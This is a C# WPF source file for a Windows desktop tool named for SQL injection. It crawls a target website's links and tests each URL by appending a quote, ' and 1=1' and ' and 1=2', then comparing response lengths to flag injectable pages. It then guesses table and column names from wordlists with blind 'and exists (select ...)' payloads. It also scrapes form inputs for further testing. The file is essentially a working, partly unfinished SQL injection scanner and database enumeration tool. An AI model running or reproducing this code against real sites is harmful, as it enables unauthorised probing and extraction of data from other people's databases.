using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows;
using System.Windows.Threading;
//using System.Windows.Forms;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Configuration;
//using mshtml;
using Microsoft.CSharp;
using HtmlAgilityPack;
//using Microsoft.CSharp.RuntimeBinder.Binder;
//using System.Net.WebClient;
using System.Net.Http;
using System.Net;
using System.IO;
using mshtml;
using System.Diagnostics;

namespace SQL注入
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        class ListData
        {
            public string HtmlText;
            public string ListName;
            public string SourceUrl;
        }
        class FieldData
        {
            public string FieldName;
            public string HtmlText;
            public string ListName;
            public string SourceUrl;
        }
        int MaxThreads;
        int CurrentThreads;
        int head;
        int tail;
        string HtmlDoc;
        static ArrayList al = new ArrayList();
        static string strRegex = @"(http|https|ftp):(\/\/|\\\\)([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)?";
        Regex regex = new Regex("href=\"[^\"]+\"",RegexOptions.IgnoreCase);
        Regex r = new Regex(strRegex, RegexOptions.IgnoreCase);
        static string temp = null;
        public MainWindow()
        {
            InitializeComponent();
            ThreadPool.SetMaxThreads(30, 2000);
         //   web1.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(webBrowser1_DocumentCompleted);

            // web1.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(web_DocumentCompleted);
        }

        bool Same(int x, int y)
        {
            if (Math.Abs(x - y) <= 10)
                return true;
            return false;
        }

        private string GetPageResource(string url, bool ShowError)
        {
            try
            {
                WebClient myWebClient = new WebClient();
                Stream myStream = myWebClient.OpenRead(url);
              //  StreamReader sr = new StreamReader(myStream, System.Text.Encoding.GetEncoding("GB18030"));
                StreamReader sr = new StreamReader(myStream, System.Text.Encoding.GetEncoding("utf-8"));
                //   StreamReader sr = new StreamReader(myStream, System.Text.Encoding.GetEncoding("windows - 1256")); 
                string strHTML = sr.ReadToEnd();
                myStream.Close();
                return strHTML;
            }
            catch (WebException e)
            {
                System.Console.WriteLine(e.Message + "Web exception");
            }
            catch (Exception e)
            {
                if (ShowError)
                  //  MessageBox.Show(e.Message, "Problems Links");
                  System.Console.WriteLine(e.Message+ "Problems Links");
                else
                   System.Console.WriteLine(e.Message + "General Exception");
            }
            return null;
        }

        private string GetPageResource(string url)
        {
            try
            {
                WebClient myWebClient = new WebClient();
                Stream myStream = myWebClient.OpenRead(url);
                StreamReader sr = new StreamReader(myStream, System.Text.Encoding.GetEncoding("GB18030"));
                string strHTML = sr.ReadToEnd();
                myStream.Close();
                return strHTML;
            }
            catch
            {
                return "-";
            }
        }

        string BuildUrl(string Root, string Cur)
        {
            try
            {
                Uri uri = new Uri(Root);
                Uri ur = new Uri(uri, Cur);
                return ur.AbsoluteUri;
            }
            catch { return null; }
        }

        private void Refreshal(object uri)
        {
            string url = (string)uri;
            string htmlCode = GetPageResource(url);
            string CurUrl;
            MatchCollection m = regex.Matches(htmlCode);
            foreach (Match mc in m)
            {
                lock (this)
                {
                    CurUrl = mc.Value.Substring(6, mc.Value.Length - 7);
                    if (!CurUrl.StartsWith("http"))
                    {
                        CurUrl = BuildUrl(url, CurUrl);
                    }
                    if (CurUrl != null && !al.Contains(CurUrl) && CurUrl.StartsWith(temp) && CurUrl.Contains(host))
                    {
                        Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { al.Add(CurUrl);
                            sw1.WriteLine(CurUrl);
                        }));
                        tail += 1;
                        Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { textBoxStatus.AppendText(CurUrl + "\r\n"); textBoxStatus.ScrollToEnd(); }));
                    }
                }
            }
            CurrentThreads -= 1;
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { PB.Value += 1; }));
            return;
        }
        ArrayList al1;
        private void Refreshal1(object uri)
        {

            //al1 = new ArrayList();
            string url = (string)uri;
            string url1 = GetFileName(url);
            url1 = url1 + ".csv";
            StreamWriter sw11 = null;
            try
            {
                sw11=new StreamWriter(url1);
            
            string htmlCode = GetPageResource(url);
            string CurUrl;
            MatchCollection m = regex.Matches(htmlCode);
            foreach (Match mc in m)
            {
                lock (this)
                {
                    CurUrl = mc.Value.Substring(6, mc.Value.Length - 7);
                    if (!CurUrl.StartsWith("http"))
                    {
                        CurUrl = BuildUrl(url, CurUrl);
                    }
                    if (CurUrl != null && !al1.Contains(CurUrl) && CurUrl.StartsWith(temp) && CurUrl.Contains(host))
                    {
                        Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
                            al1.Add(CurUrl);
                            sw11.WriteLine(CurUrl);
                        }));
                        tail += 1;
                        Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { textBoxStatus.AppendText(CurUrl + "\r\n"); textBoxStatus.ScrollToEnd(); }));
                    }
                }
            }
            CurrentThreads -= 1;
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { PB.Value += 1; }));
            sw11.Close();
            }
            catch (Exception ex)
            {

            }
            return;
        }

        private void SumPageSizes()
        {
            // Make a list of web addresses.
            List<string> urlList = SetUpURLList();

            var total = 0;
            foreach (var url in urlList)
            {
                // GetURLContents returns the contents of url as a byte array.
                byte[] urlContents = GetURLContents(url);

                DisplayResults(url, urlContents);

                // Update the total.
                total += urlContents.Length;
            }

            // Display the total count for all of the web addresses.
           // resultsTextBox.Text +=
                string.Format("\r\n\r\nTotal bytes returned:  {0}\r\n", total);
        }


        private List<string> SetUpURLList()
        {
            var urls = new List<string>
    {
        "http://msdn.microsoft.com/library/windows/apps/br211380.aspx",
        "http://msdn.microsoft.com",
        "http://msdn.microsoft.com/en-us/library/hh290136.aspx",
        "http://msdn.microsoft.com/en-us/library/ee256749.aspx",
        "http://msdn.microsoft.com/en-us/library/hh290138.aspx",
        "http://msdn.microsoft.com/en-us/library/hh290140.aspx",
        "http://msdn.microsoft.com/en-us/library/dd470362.aspx",
        "http://msdn.microsoft.com/en-us/library/aa578028.aspx",
        "http://msdn.microsoft.com/en-us/library/ms404677.aspx",
        "http://msdn.microsoft.com/en-us/library/ff730837.aspx"
    };
            return urls;
        }


        private string GetURLContents1(string url)
        {
            // The downloaded resource ends up in the variable named content.
            var content = new MemoryStream();

            // Initialize an HttpWebRequest for the current URL.
            var webReq = (HttpWebRequest)WebRequest.Create(url);
            string result = "";
            // Send the request to the Internet resource and wait for
            // the response.
            // Note: you can't use HttpWebRequest.GetResponse in a Windows Store app.
            using (WebResponse response = webReq.GetResponse())
            {
                // Get the data stream that is associated with the specified URL.
                using (Stream responseStream = response.GetResponseStream())
                {
                    StreamReader readstream = new StreamReader(responseStream, Encoding.UTF8);
                    result = readstream.ReadToEnd();
                    // Read the bytes in responseStream and copy them to content.  
                  //  responseStream.CopyTo(content);
                }
            }

            // Return the result as a byte array.
            return result;
        }
        private byte[] GetURLContents(string url)
        {
            // The downloaded resource ends up in the variable named content.
            var content = new MemoryStream();

            // Initialize an HttpWebRequest for the current URL.
            var webReq = (HttpWebRequest)WebRequest.Create(url);

            // Send the request to the Internet resource and wait for
            // the response.
            // Note: you can't use HttpWebRequest.GetResponse in a Windows Store app.
            using (WebResponse response = webReq.GetResponse())
            {
                // Get the data stream that is associated with the specified URL.
                using (Stream responseStream = response.GetResponseStream())
                {
                    // Read the bytes in responseStream and copy them to content.  
                    responseStream.CopyTo(content);
                }
            }

            // Return the result as a byte array.
            return content.ToArray();
        }


        private void DisplayResults(string url, byte[] content)
        {
            // Display the length of each website. The string format 
            // is designed to be used with a monospaced font, such as
            // Lucida Console or Global Monospace.
            var bytes = content.Length;
            // Strip off the "http://".
            var displayURL = url.Replace("http://", "");
         //   resultsTextBox.Text += string.Format("\n{0,-58} {1,8}", displayURL, bytes);
        }
        private void Check(object url)
        {
            string SourceUrl = (string)url;
            string HtmlText = GetPageResource(SourceUrl, true);
            if (HtmlText == "NOTHING!!" || HtmlText==null)
            {
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { lableSingle.Content = "Detection is complete"; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { textBoxSingle.IsEnabled = true; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { Button_Check.IsEnabled = true; }));
                return;
            }
            int std = HtmlText.Length;
            int cp1, cp2, cp3;
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressbaiSingle.Value += 1; }));
            string HtmlCP1 = GetPageResource(SourceUrl + "'", false);
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressbaiSingle.Value += 1; }));
            string HtmlCP2 = GetPageResource(SourceUrl + " and 1=1", false);
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressbaiSingle.Value += 1; }));
            string HtmlCP3 = GetPageResource(SourceUrl + " and 1=2", false);
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressbaiSingle.Value += 1; }));
            try
            {
                cp1 = HtmlCP1.Length;
                cp2 = HtmlCP2.Length;
                cp3 = HtmlCP3.Length;
                if (Same(std, cp2) && !Same(std, cp1) && !Same(std, cp3))
                {
                    injected.WriteLine(url);
                    injected.Flush();
                    //     MessageBox.Show("SQL injection vulnerability");
                    System.Console.WriteLine("SQL injection vulnerability");
                }
                if (Tools.Infected(SourceUrl))
                {
                    //  Res.AppendText(n + "INFECTED");
                    injected.WriteLine(url);
                    injected.Flush();
                    //     MessageBox.Show("SQL injection vulnerability");
                    System.Console.WriteLine("SQL injection vulnerability");
                }
            
                else
                {
              //      MessageBox.Show("Secure Link");
                    System.Console.WriteLine("Secure Link");
                }
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { lableSingle.Content = "Detection is complete"; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { textBoxSingle.IsEnabled = true; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { Button_Check.IsEnabled = true; }));
            }
            catch
            {
                System.Console.WriteLine("Secure Link");
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { lableSingle.Content = "Detection is complete"; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { textBoxSingle.IsEnabled = true; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { Button_Check.IsEnabled = true; }));
            }
            return;
        }
       
        private void PrintDomBegin()
        {
            if (web1.Document != null)
            {
                IHTMLElementCollection elemColl = null;
                IHTMLDocument doc = (IHTMLDocument)web1.Document;
                if (doc != null)
                {
                 //   elemColl = doc.get .getElementsByTagName("HTML");
                  //  String str = PrintDom(elemColl, new System.Text.StringBuilder(), 0);
                    // web1.doc .DocumentText = str;
                    //web1.Document. = str;
                }
            }
        }

        private string PrintDom(HtmlAgilityPack.HtmlNodeCollection elemColl, System.Text.StringBuilder returnStr, Int32 depth)
        {
            System.Text.StringBuilder str = new System.Text.StringBuilder();
          //  IHTMLElement htmlElementCollection = null;

            foreach (HtmlNode elem in elemColl)
            {
                string elemName;

                elemName = elem.GetAttributeValue("ID","null");
                if (elemName == null || elemName.Length == 0)
                {
                    elemName = elem.GetAttributeValue("name","null");
                    if (elemName == null || elemName.Length == 0)
                    {
                        elemName = "<no name>";
                    }
                }

                str.Append(' ', depth * 4);
                str.Append(elemName + ": " + elem.Name + "(Level " + depth + ")");
                returnStr.AppendLine(str.ToString());

                if (elem.HasChildNodes)
                {
                    PrintDom(elem.ChildNodes, returnStr, depth + 1);
                }

                str.Remove(0, str.Length);
            }

            return (returnStr.ToString());
        }

        StreamWriter alllinks =null;
        StreamWriter formLinks = null;
        StreamWriter formLinks1 = null;
        StreamWriter formLinks2 = null;
        StreamWriter formLinks3 = null;
        private void Check2(string url)
        {
            string SourceUrl = url;
          //  string HtmlText = GetPageResource(SourceUrl, true);
            Uri myUri = new Uri(SourceUrl);
            WebBrowser browser;
            //  System.Windows.Forms.WebBrowser b = new System.Windows.Forms.WebBrowser();
            try
            {

                string result = GetURLContents1(url);
                //web1.Navigate(myUri);
                HtmlDocument doc = new HtmlDocument();
                HtmlNode.ElementsFlags.Remove("form");

                //System.Threading.Thread.Sleep(30);
                if (result != null)
                {
                    HtmlNodeCollection elemColl = null;
                    //  HTMLDocument doc = (HTMLDocument)result;
                    //  HtmlAgilityPack.HTMLDocument doc = new HtmlAgilityPack.HTMLDocument();
                    // .LoadHtml(AboveHtmlString);
                    //   doc.Load(result);
                    doc.LoadHtml(result);
                    if (doc != null) {
                        var articleNodes = doc.DocumentNode.SelectNodes("//text()[normalize-space()]");
                        try
                        {
                            var document = doc as mshtml.HTMLDocument;
                            var inputs = document.getElementsByTagName("input");
                            foreach (mshtml.IHTMLElement element in inputs)
                            {
                                System.Console.WriteLine("in link" + url + ".." + element + ".." + element.outerHTML);
                                formLinks3.WriteLine(url + "," + element + "," + element.outerHTML);
                            }
                        }
                        catch(Exception ex)
                        {

                        }

                        if (articleNodes != null && articleNodes.Any())
                        {
                            foreach (var articleNode in articleNodes)
                            {

                                System.Console.WriteLine("in link" + url +".."+articleNode.InnerText);
                                alllinks.WriteLine(url + "," + articleNode.InnerText);

                            }
                        }

                        var node = doc.DocumentNode.SelectSingleNode("//form");
                        if (node != null)
                        {
                            var nodes = node.SelectNodes(".//input[@name]");
                            foreach (HtmlNode innode in node.Elements("input"))
                            {
                                System.Console.WriteLine("in link" + url + ".." + node + ".." + innode);
                                formLinks.WriteLine(url + "," + node + "," + innode.OuterHtml);

                            }
                        }
                            var formnodes = doc.DocumentNode.SelectNodes("//form");

                        if (formnodes != null && formnodes.Any())
                        {
                            foreach (HtmlNode innode in formnodes.Elements("input"))
                            {
                                System.Console.WriteLine("in link" + url + ".." + formnodes+".."+ innode);
                                formLinks1.WriteLine(url + "," + formnodes + "," + innode.OuterHtml);

                            }
                            //  var nodes = formnodes.SelectNodes(".//input[@name]");

                            foreach (var formnode in formnodes)
                            {

                                System.Console.WriteLine("in link" + url + ".." + formnode.InnerText);
                                formLinks2.WriteLine(url + "," + formnode.OuterHtml);

                            }
                        }


                        formLinks.Flush();
                        formLinks1.Flush();
                        formLinks2.Flush();
                        formLinks3.Flush();
                        alllinks.Flush();

                    }
              //      if (doc != null)
                //    {
                  //      var value = doc.DocumentNode.SelectSingleNode("//input").Attributes["value"].Value;
                  //  }

                }
            }
            catch(Exception ex)
            {

            }
            return;
        }
        private void Check1(object url)
        {
            string SourceUrl = (string)url;
            string HtmlText = GetPageResource(SourceUrl, true);
            Uri myUri = new Uri(SourceUrl);
            //  System.Windows.Forms.WebBrowser b = new System.Windows.Forms.WebBrowser();
            try
            {
                web1.Navigate(myUri);
           
            HTMLDocument htmlDoc = (HTMLDocument)web1.Document;
            IHTMLElementCollection htmlElementCollection = htmlDoc.getElementsByTagName("form");

            //Set All Anchore Target As _self For Stop Opening New Window......
            foreach (IHTMLElement curElement in htmlElementCollection)
            {
                //    string targetAtt = curElement.getAttribute("target");
                System.Console.WriteLine(curElement);
            }
           
            if (HtmlText == "NOTHING!!" || HtmlText == null)
            {
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { lableSingle.Content = "Detection is complete"; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { textBoxSingle.IsEnabled = true; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { Button_Check.IsEnabled = true; }));
                return;
            }
            }
            catch (Exception ex)
            {

            }

            return;
        }

        private bool Check(string SourceUrl)
        {
            HtmlDoc = GetPageResource(SourceUrl);
            if (HtmlDoc == "NOTHING!!")
            {
                return false;
            }
            int std = HtmlDoc.Length;
            string HtmlCP1 = GetPageResource(SourceUrl + "'");
            int cp1 = HtmlCP1.Length;
            string HtmlCP2 = GetPageResource(SourceUrl + " and 1=1");
            int cp2 = HtmlCP2.Length;
            string HtmlCP3 = GetPageResource(SourceUrl + " and 1=2");
            int cp3 = HtmlCP3.Length;
            if (Same(std, cp2) && !Same(std, cp1) && !Same(std, cp3))
            {
                return true;
            }
            else
                return false;
        }

        StreamWriter injected;
        private void WebSite_Check(object sender, RoutedEventArgs e)
        {
         //   injected = new StreamWriter("injected.csv");
           
            OpenFileDialog theDialog = new OpenFileDialog();
            theDialog.Title = "Open Text File";
            theDialog.Filter = "CSV files|*.csv |All Files (*.*)|*.*";
            theDialog.InitialDirectory = @"C:\Users\ialsmadi\Desktop\Malware\SQL_Injection_Projects\Main\old";
            if (theDialog.ShowDialog() == true)
            {
              //  string file = System.IO.Path.GetFileName(theDialog.FileName);
                string file = theDialog.FileName;
                string result2 = System.IO.Path.GetFileNameWithoutExtension(file);
                string injected1 = "injected" + result2 + ".csv";
                injected = new StreamWriter(injected1);
                injected.WriteLine("successfully injected links");
                string path = System.IO.Path.GetDirectoryName(file); //when i did it like this it's work fine but all the time give me same path whatever where my "*.txt" file is
                //Insert code to read the stream here. 
                //fileName = openFileDialog1.FileName; 
                StreamReader reader = new StreamReader(file);
                string line = null;
                while ((line = reader.ReadLine()) != null)
                {
                    /* Lengthy algorithm */
                //    line = reader.ReadLine();
                    Thread t = new Thread(new ParameterizedThreadStart(Check));
                    t.Start((object)line);
                    textBoxSingle.IsEnabled = false;
                    progressbaiSingle.Value = 0;
                    Button_Check.IsEnabled = false;
                    lableSingle.Content = "Detecting";
                }
            }
            injected.Close();
            MessageBox.Show("Done");
            return;
        }
        private void Button_Check_Click(object sender, RoutedEventArgs e)
        {
            Thread t = new Thread(new ParameterizedThreadStart(Check));
            t.Start((object)textBoxSingle.Text.ToString());
            textBoxSingle.IsEnabled = false;
            progressbaiSingle.Value = 0;
            Button_Check.IsEnabled = false;
            lableSingle.Content = "Detecting";
            return;
        }
        StreamWriter sw1;
        private void GetWholeSite()
        {
       //     sw1 = new StreamWriter("links1.csv");
            for (; ; )
            {
                if (head < tail && CurrentThreads < MaxThreads)
                {
                    CurrentThreads += 1;
                    Thread t = new Thread(new ParameterizedThreadStart(Refreshal));
                    string test = al[head].ToString();
                    if (test.Contains(host))
                    {
                        t.Start(al[head]);
                        head += 1;
                    }
                }
                else if (head == tail && CurrentThreads == 0)
                    break;
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { PB.Maximum = tail; LB.Content = PB.Value.ToString() + " / " + PB.Maximum.ToString();}));
                Thread.Sleep(50);
         //       sw1.Flush();
            }
            MessageBox.Show("Search completed!");
            sw1.Close();
            return;
        }
        private void GetWholeSite2()
        {
            //     sw1 = new StreamWriter("links1.csv");
            for (;;)
            {
                if (head < tail && CurrentThreads < MaxThreads)
                {
                    CurrentThreads += 1;
                    Thread t = new Thread(new ParameterizedThreadStart(Refreshal1));
                    string test = al[head].ToString();
                    if (test.Contains(host))
                    {
                        t.Start(al[head]);
                        head += 1;
                    }
                }
                else if (head == tail && CurrentThreads == 0)
                    break;
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { PB.Maximum = tail; LB.Content = PB.Value.ToString() + " / " + PB.Maximum.ToString(); }));
                Thread.Sleep(50);
                //       sw1.Flush();
            }
         //   MessageBox.Show("Search completed!");
            //sw1.Close();
            return;
        }
        private void GetWholeSite1(string link)
        {
            al1 = new ArrayList();
            al1.Add(link);
            //     sw1 = new StreamWriter("links1.csv");
         //   Stopwatch s = new Stopwatch();
          //  s.Start();
       //     while (s.Elapsed < TimeSpan.FromSeconds(900))
       var startTime = DateTime.UtcNow;

while(DateTime.UtcNow - startTime < TimeSpan.FromMinutes(10))
            {
                if (head < tail && CurrentThreads < MaxThreads)
                {
                    CurrentThreads += 1;
                    Thread t = new Thread(new ParameterizedThreadStart(Refreshal1));
                //    Thread t = new Thread(() => Refreshal1(link));
                    string test = al1[head].ToString();
                    if (test.Contains(host))
                    {
                           t.Start(al[head]);
                        //t.Start(link);
                        head += 1;
                    }
                }
                else if (head == tail && CurrentThreads == 0)
                    break;
              //  s.Stop();
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { PB.Maximum = tail; LB.Content = PB.Value.ToString() + " / " + PB.Maximum.ToString(); }));
                Thread.Sleep(50);
                //       sw1.Flush();
            }
           
            //   MessageBox.Show("Search completed!");
            //sw1.Close();
            return;
        }
        string host;
        private void Button_WholeSite_Click(object sender, EventArgs e)
        {
            #region Original code
           
            MaxThreads = 30;
            CurrentThreads = 0;
            PB.Value = 0;
            head = 0;
            tail = 1;
            al.Clear();
            al.Add(textBoxSite.Text);
          
            Uri myUri = new Uri(textBoxSite.Text);
            host = myUri.Host;
            char[] arr = new char[] { 'w', '.'};
            host = host.TrimStart(arr);
            temp = textBoxMain.Text;
            Thread t = new Thread(new ThreadStart(GetWholeSite));
            t.Start();
            StreamWriter links = new StreamWriter("links.csv");
           
            //sw1.WriteLine(textBoxSite.Text);
            foreach (string link in al)
            {
                links.WriteLine(link);
            }

            links.Close();
           
            return;
            #endregion
            
        }

        private void parseWebsite(string url)
        {
            #region Original code

            MaxThreads = 30;
            CurrentThreads = 0;
            PB.Value = 0;
            head = 0;
            tail = 1;
            al.Clear();
            al.Add(url);

            Uri myUri = new Uri(url);
            host = myUri.Host;
            char[] arr = new char[] { 'w', '.' };
            host = host.TrimStart(arr);
            temp = textBoxMain.Text;
          //  Thread t = new Thread(new ThreadStart(GetWholeSite1()));
            Thread t = new Thread(() => GetWholeSite2());
            t.Start();
            string name = GetFileName(url);
            name = name + ".csv";
            StreamWriter links = null;
            try
            {
                links= new StreamWriter(name);
            

            //sw1.WriteLine(textBoxSite.Text);
            foreach (string link in al1)
            {
                links.WriteLine(link);
            }

            links.Close();
            }
            catch (Exception ex)
            {

            }

            return;
            #endregion

        }

        private static string GetFileName(string hrefLink)
        {
            string[] parts = hrefLink.Split('/');
            string fileName = "";
            int k = 0;
            for(k=0; k < parts.Length; k++)
            {
                if (parts[k].Contains("www")){
                //    char[] temp = 'www.';

                    fileName = parts[k].Remove(0, 4);
                }
                
            }

            if (fileName.Length < 2)
            {
                fileName=parts[2];
            }

          //  if (parts.Length > 0)
            //    fileName = parts[parts.Length - 1];
            //else
              //  fileName = hrefLink;

            return fileName;
        }
        private void List_Click_1(object sender, RoutedEventArgs e)
        {
            StreamReader sr = new StreamReader(@"List.txt");
            List<string> ls = new List<string>();
            string temp;
            while ((temp = sr.ReadLine()) != null)
                ls.Add(temp);
            sr.Close();
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressBar.Value = 0; progressBar.Maximum = ls.Count; }));
            foreach (string ListName in ls)
            {
                ListData ld = new ListData();
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { ld.SourceUrl = InjetUrl.Text; ld.ListName = ListName; ld.HtmlText = HtmlDoc; }));
                ThreadPool.QueueUserWorkItem(new WaitCallback(GuessListName), (object)ld);
            }
            return;
        }

        private void GuessListName(object listdata)
        {
            ListData ld = (ListData)listdata;
            try
            {
                if (Same(GetPageResource(ld.SourceUrl + "and exists (select * from [" + ld.ListName + "])").Length, ld.HtmlText.Length))
                    Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { ListText.AppendText(ld.ListName + "\r\n"); Field.IsEnabled = true; }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressBar.Value += 1; }));
            }
            catch { Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressBar.Value += 1; })); }
            return;
        }

        private void Field_Click_1(object sender, RoutedEventArgs e)
        {
            StreamReader sr = new StreamReader(@"Field.txt");
            List<string> ls = new List<string>();
            string temp;
            while ((temp = sr.ReadLine()) != null)
                ls.Add(temp);
            sr.Close();
            Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressBar.Value = 0; progressBar.Maximum = ls.Count; }));
            foreach (string FieldName in ls)
            {
                FieldData fd = new FieldData();
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { fd.SourceUrl = InjetUrl.Text; fd.ListName = ListName.Text; fd.HtmlText = HtmlDoc; fd.FieldName = FieldName; }));
                ThreadPool.QueueUserWorkItem(new WaitCallback(GuessFieldName), (object)fd);
            }
            return;
        }

        private void GuessFieldName(object fielddata)
        {
            FieldData fd = (FieldData)fielddata;
            try
            {
                if (Same(GetPageResource(fd.SourceUrl + "and exists (select [" + fd.FieldName +"] from [" + fd.ListName + "])").Length, fd.HtmlText.Length))
                    Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { FieldText.AppendText(fd.FieldName + "\r\n"); }));
                Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressBar.Value += 1; }));
            }
            catch { Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => { progressBar.Value += 1; })); }
            return;
        }

        private void Lenth_Click_1(object sender, RoutedEventArgs e)
        {

        }

        private void Content_Click_1(object sender, RoutedEventArgs e)
        {

        }

        private void ListDict_Click_1(object sender, RoutedEventArgs e)
        {
            if (File.Exists("List.txt"))
            {
                System.Diagnostics.Process.Start("List.txt");
            }
            else
            { 
                File.Create("List.txt").Close();
                System.Diagnostics.Process.Start("List.txt");
            }
               
            
        }

        private void FieldDict_Click_1(object sender, RoutedEventArgs e)
        {
            if (File.Exists("Field.txt"))
            {
                System.Diagnostics.Process.Start("Field.txt");
            }
            else
            {
                File.Create("Field.txt").Close();
                System.Diagnostics.Process.Start("Field.txt");
            }
        }

        private void Test_Click_1(object sender, RoutedEventArgs e)
        {
            if (Check(InjetUrl.Text))
            {
                List.IsEnabled = true;
            }
            else
                MessageBox.Show("This link does not seem to injection (/>.<\\)");
        }

        private void Check_Forms_Click(object sender, RoutedEventArgs e)
        {
         //   MessageBox.Show("check forms");
            injected = new StreamWriter("injected_Links.csv");
            injected.WriteLine("Form links");
            OpenFileDialog theDialog = new OpenFileDialog();
            theDialog.Title = "Open Text File";
            theDialog.Filter = "CSV files|*.csv";
            theDialog.InitialDirectory = @"C:\";
            if (theDialog.ShowDialog() == true)
            {
                string file = System.IO.Path.GetFileName(theDialog.FileName);
                string path = System.IO.Path.GetFullPath(file); //when i did it like this it's work fine but all the time give me same path whatever where my "*.txt" file is
                //Insert code to read the stream here. 
                //fileName = openFileDialog1.FileName; 
                StreamReader reader = new StreamReader(path);
                formLinks = new StreamWriter("formLinks.csv");
                formLinks1 = new StreamWriter("formLinks1.csv");
                formLinks2 = new StreamWriter("formLinks2.csv");
                formLinks3 = new StreamWriter("formLinks3.csv");
                alllinks = new StreamWriter("alllinks");
                string line = null;// reader.ReadLine();
                while ((line = reader.ReadLine()) != null)
                {
                    /* Lengthy algorithm */
                  //  ;
                    //  Thread t = new Thread(new ParameterizedThreadStart(Check1));
                    //  t.Start((object)line);
                    Check2(line);
                    textBoxSingle.IsEnabled = false;
                    progressbaiSingle.Value = 0;
                    Button_Check.IsEnabled = false;
                    lableSingle.Content = "Detecting";
                }
            }
            injected.Close();
            formLinks.Close();
            formLinks1.Close();
            formLinks2.Close();

            return;
        }

        private void Authentification_Click(object sender, EventArgs e)
        {
            System.Threading.Thread.Sleep(100);
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {

        }

        private void Button_WholeSite_Click(object sender, RoutedEventArgs e)
        {

        }

        private void Parse_Website_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog theDialog = new OpenFileDialog();
            theDialog.Title = "Open Text File";
            theDialog.Filter = "Text Files (.txt)|*.txt|All Files (*.*)|*.*";
            theDialog.InitialDirectory = @"C:\";
            if (theDialog.ShowDialog() == true)
            {
                string file = System.IO.Path.GetFileName(theDialog.FileName);
                string path = System.IO.Path.GetFullPath(file); //when i did it like this it's work fine but all the time give me same path whatever where my "*.txt" file is
                //Insert code to read the stream here. 
                //fileName = openFileDialog1.FileName; 
                StreamReader reader = new StreamReader(path);
                //     formLinks = new StreamWriter("formLinks.csv");
                //    formLinks1 = new StreamWriter("formLinks1.csv");
                //    formLinks2 = new StreamWriter("formLinks2.csv");
                //    formLinks3 = new StreamWriter("formLinks3.csv");
                //    alllinks = new StreamWriter("alllinks");
                string line = null;// reader.ReadLine();
                while ((line = reader.ReadLine()) != null)
                {
                    if (line.Length > 7)
                    {
                        parseWebsite(line);
                    }
                }
            }
        }
    }
}

